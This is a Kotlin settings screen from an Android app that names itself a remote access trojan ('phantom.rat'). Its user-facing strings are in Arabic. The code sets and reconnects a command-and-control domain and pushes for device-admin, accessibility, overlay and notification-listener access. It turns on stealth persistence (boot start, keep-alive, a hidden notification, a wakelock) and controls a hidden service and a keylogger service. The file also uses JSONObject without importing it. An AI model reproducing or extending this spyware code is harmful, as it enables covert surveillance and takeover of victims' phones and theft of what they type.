package com.phantom.rat.ui

import android.content.Intent
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.PowerManager
import android.provider.Settings
import android.view.LayoutInflater
import android.view.View
import android.view.ViewGroup
import android.widget.*
import androidx.fragment.app.Fragment
import com.google.android.material.button.MaterialButton
import com.google.android.material.card.MaterialCardView
import com.google.android.material.dialog.MaterialAlertDialogBuilder
import com.google.android.material.switchmaterial.SwitchMaterial
import com.google.android.material.textfield.TextInputEditText
import com.google.android.material.snackbar.Snackbar
import com.phantom.rat.R
import com.phantom.rat.core.C2Client
import com.phantom.rat.core.SessionManager
import com.phantom.rat.services.HiddenService
import com.phantom.rat.services.KeyloggerService
import com.phantom.rat.utils.DeviceUtils
import com.phantom.rat.utils.PermissionUtils

class SettingsFragment : Fragment() {

    private lateinit var sessionManager: SessionManager
    private lateinit var permissionUtils: PermissionUtils
    private lateinit var deviceUtils: DeviceUtils
    private lateinit var c2Client: C2Client

    override fun onCreateView(inflater: LayoutInflater, container: ViewGroup?, savedInstanceState: Bundle?): View? {
        return inflater.inflate(R.layout.fragment_settings, container, false)
    }

    override fun onViewCreated(view: View, savedInstanceState: Bundle?) {
        super.onViewCreated(view, savedInstanceState)
        
        sessionManager = SessionManager(requireContext())
        permissionUtils = PermissionUtils(requireContext())
        deviceUtils = DeviceUtils(requireContext())
        c2Client = C2Client(requireContext())
        
        setupConnectionSettings(view)
        setupPermissions(view)
        setupPersistence(view)
        setupInfo(view)
        setupDangerous(view)
    }

    private fun setupConnectionSettings(view: View) {
        view.findViewById<TextInputEditText>(R.id.etC2Domain).setText(sessionManager.getC2Domain())
        
        view.findViewById<MaterialButton>(R.id.btnSaveC2).setOnClickListener {
            val domain = view.findViewById<TextInputEditText>(R.id.etC2Domain).text.toString()
            if (domain.isNotEmpty()) {
                sessionManager.setC2Domain(domain)
                Snackbar.make(view, "✅ تم حفظ C2 Domain: $domain", Snackbar.LENGTH_SHORT).show()
            }
        }
        
        view.findViewById<MaterialButton>(R.id.btnReconnect).setOnClickListener {
            c2Client.disconnect()
            c2Client.connect()
            Snackbar.make(view, "🔄 جاري إعادة الاتصال...", Snackbar.LENGTH_SHORT).show()
        }
        
        view.findViewById<MaterialButton>(R.id.btnCopyId).setOnClickListener {
            val clipboard = requireContext().getSystemService(android.content.Context.CLIPBOARD_SERVICE) 
                as android.content.ClipboardManager
            val clip = android.content.ClipData.newPlainText("Device ID", sessionManager.getDeviceId())
            clipboard.setPrimaryClip(clip)
            Snackbar.make(view, "📋 تم نسخ Device ID", Snackbar.LENGTH_SHORT).show()
        }
    }

    private fun setupPermissions(view: View) {
        val status = permissionUtils.getPermissionsStatus()
        
        view.findViewById<SwitchMaterial>(R.id.switchAdmin).isChecked = 
            status.optBoolean("is_device_admin", false)
        view.findViewById<SwitchMaterial>(R.id.switchAdmin).setOnCheckedChangeListener { _, isChecked ->
            if (isChecked && !status.optBoolean("is_device_admin", false)) {
                permissionUtils.requestDeviceAdmin(requireActivity())
            }
        }
        
        view.findViewById<SwitchMaterial>(R.id.switchOverlay).isChecked =
            permissionUtils.canDrawOverlays()
        view.findViewById<SwitchMaterial>(R.id.switchOverlay).setOnCheckedChangeListener { _, isChecked ->
            if (isChecked && !permissionUtils.canDrawOverlays()) {
                permissionUtils.requestOverlayPermission(requireActivity())
            }
        }
        
        view.findViewById<SwitchMaterial>(R.id.switchAccessibility).isChecked =
            permissionUtils.isAccessibilityServiceEnabled()
        view.findViewById<SwitchMaterial>(R.id.switchAccessibility).setOnCheckedChangeListener { _, isChecked ->
            if (isChecked && !permissionUtils.isAccessibilityServiceEnabled()) {
                permissionUtils.requestAccessibilityService(requireActivity())
            }
        }
        
        view.findViewById<SwitchMaterial>(R.id.switchUsageStats).isChecked =
            permissionUtils.hasUsageStatsPermission()
        view.findViewById<SwitchMaterial>(R.id.switchUsageStats).setOnCheckedChangeListener { _, isChecked ->
            if (isChecked && !permissionUtils.hasUsageStatsPermission()) {
                val intent = Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS)
                startActivity(intent)
            }
        }
        
        view.findViewById<SwitchMaterial>(R.id.switchNotificationListener).isChecked =
            permissionUtils.isNotificationListenerEnabled()
        view.findViewById<SwitchMaterial>(R.id.switchNotificationListener).setOnCheckedChangeListener { _, isChecked ->
            if (isChecked && !permissionUtils.isNotificationListenerEnabled()) {
                permissionUtils.requestNotificationListener(requireActivity())
            }
        }
        
        view.findViewById<SwitchMaterial>(R.id.switchBatteryOptimization).setOnCheckedChangeListener { _, isChecked ->
            if (isChecked) {
                val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                    data = Uri.parse("package:${requireContext().packageName}")
                }
                startActivity(intent)
            }
        }
        
        view.findViewById<MaterialButton>(R.id.btnRequestAllPermissions).setOnClickListener {
            permissionUtils.checkAndRequestAllPermissions(requireActivity())
            Snackbar.make(view, "📋 تم طلب جميع الصلاحيات", Snackbar.LENGTH_SHORT).show()
        }
        
        view.findViewById<MaterialButton>(R.id.btnShowPermissions).setOnClickListener {
            showPermissionsDialog(status)
        }
    }

    private fun setupPersistence(view: View) {
        view.findViewById<SwitchMaterial>(R.id.switchAutoStart).isChecked = true
        view.findViewById<SwitchMaterial>(R.id.switchBootReceiver).setOnCheckedChangeListener { _, isChecked ->
            sessionManager.saveConfig("boot_receiver", if (isChecked) "1" else "0")
        }
        
        view.findViewById<SwitchMaterial>(R.id.switchKeepAlive).isChecked = true
        view.findViewById<SwitchMaterial>(R.id.switchKeepAlive).setOnCheckedChangeListener { _, isChecked ->
            sessionManager.saveConfig("keep_alive", if (isChecked) "1" else "0")
        }
        
        view.findViewById<SwitchMaterial>(R.id.switchNotificationHide).isChecked = true
        view.findViewById<SwitchMaterial>(R.id.switchNotificationHide).setOnCheckedChangeListener { _, isChecked ->
            sessionManager.saveConfig("hide_notification", if (isChecked) "1" else "0")
        }
        
        view.findViewById<SwitchMaterial>(R.id.switchWakelock).isChecked = true
    }

    private fun setupInfo(view: View) {
        view.findViewById<TextView>(R.id.tvDeviceId).text = sessionManager.getDeviceId()
        view.findViewById<TextView>(R.id.tvDeviceModel).text = android.os.Build.MODEL
        view.findViewById<TextView>(R.id.tvAndroidVersion).text = android.os.Build.VERSION.RELEASE
        view.findViewById<TextView>(R.id.tvAppVersion).text = "1.0.0"
        
        val deviceInfo = deviceUtils.getFullDeviceInfo()
        view.findViewById<TextView>(R.id.tvRamInfo).text = 
            "RAM: ${deviceUtils.getStorageInfo().optJSONArray("storages")?.optJSONObject(0)?.optString("total_formatted", "?")}"
        
        view.findViewById<MaterialButton>(R.id.btnFullDeviceInfo).setOnClickListener {
            val info = deviceUtils.getFullDeviceInfo().toString(2)
            MaterialAlertDialogBuilder(requireContext())
                .setTitle("ℹ️ معلومات الجهاز الكاملة")
                .setMessage(info)
                .setPositiveButton("👍 حسناً", null)
                .setNeutralButton("📋 نسخ") { _, _ ->
                    val clipboard = requireContext().getSystemService(android.content.Context.CLIPBOARD_SERVICE)
                        as android.content.ClipboardManager
                    val clip = android.content.ClipData.newPlainText("Device Info", info)
                    clipboard.setPrimaryClip(clip)
                    Snackbar.make(view, "📋 تم النسخ", Snackbar.LENGTH_SHORT).show()
                }
                .show()
        }
    }

    private fun setupDangerous(view: View) {
        view.findViewById<MaterialCardView>(R.id.cardResetSession).setOnClickListener {
            MaterialAlertDialogBuilder(requireContext())
                .setTitle("⚠️ تحذير!")
                .setMessage("هل أنت متأكد من إعادة تعيين الجلسة؟ سيتم فقدان جميع البيانات والجلسات المخزنة.")
                .setPositiveButton("🔄 إعادة تعيين") { _, _ ->
                    sessionManager.clearSession()
                    Snackbar.make(view, "✅ تم إعادة تعيين الجلسة", Snackbar.LENGTH_SHORT).show()
                }
                .setNegativeButton("إلغاء", null)
                .show()
        }
        
        view.findViewById<MaterialCardView>(R.id.cardStopService).setOnClickListener {
            MaterialAlertDialogBuilder(requireContext())
                .setTitle("⚠️ تحذير!")
                .setMessage("هل تريد إيقاف جميع الخدمات؟ سيتوقف التطبيق عن العمل.")
                .setPositiveButton("⏹️ إيقاف") { _, _ ->
                    requireContext().stopService(Intent(requireContext(), HiddenService::class.java))
                    requireContext().stopService(Intent(requireContext(), KeyloggerService::class.java))
                    Snackbar.make(view, "⏹️ تم إيقاف الخدمات", Snackbar.LENGTH_SHORT).show()
                }
                .setNegativeButton("إلغاء", null)
                .show()
        }
        
        view.findViewById<MaterialCardView>(R.id.cardUninstall).setOnClickListener {
            MaterialAlertDialogBuilder(requireContext())
                .setTitle("⚠️ إلغاء التثبيت")
                .setMessage("هل تريد إلغاء تثبيت التطبيق؟")
                .setPositiveButton("🗑️ إلغاء") { _, _ ->
                    val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
                        data = Uri.parse("package:${requireContext().packageName}")
                    }
                    startActivity(intent)
                }
                .setNegativeButton("إلغاء", null)
                .show()
        }
    }

    private fun showPermissionsDialog(status: JSONObject) {
        val granted = status.optJSONArray("granted")
        val denied = status.optJSONArray("denied")
        
        val message = buildString {
            append("✅ الصلاحيات الممنوحة (${granted?.length() ?: 0}):\n")
            granted?.let { arr ->
                for (i in 0 until arr.length()) {
                    append("  • ${arr.getJSONObject(i).optString("name")}\n")
                }
            }
            append("\n❌ الصلاحيات المرفوضة (${denied?.length() ?: 0}):\n")
            denied?.let { arr ->
                for (i in 0 until arr.length()) {
                    append("  • ${arr.getJSONObject(i).optString("name")}\n")
                }
            }
            append("\n🔧 صلاحيات خاصة:\n")
            append("  • تراكب الشاشة: ${if (status.optBoolean("has_overlay")) "✅" else "❌"}\n")
            append("  • إحصائيات الاستخدام: ${if (status.optBoolean("has_usage_stats")) "✅" else "❌"}\n")
            append("  • مسؤول الجهاز: ${if (status.optBoolean("is_device_admin")) "✅" else "❌"}\n")
            append("  • مراقب الإشعارات: ${if (status.optBoolean("has_notification_listener")) "✅" else "❌"}\n")
            append("  • خدمة الوصول: ${if (status.optBoolean("has_accessibility")) "✅" else "❌"}")
        }
        
        MaterialAlertDialogBuilder(requireContext())
            .setTitle("📋 حالة الصلاحيات")
            .setMessage(message)
            .setPositiveButton("👍 حسناً", null)
            .show()
    }
}
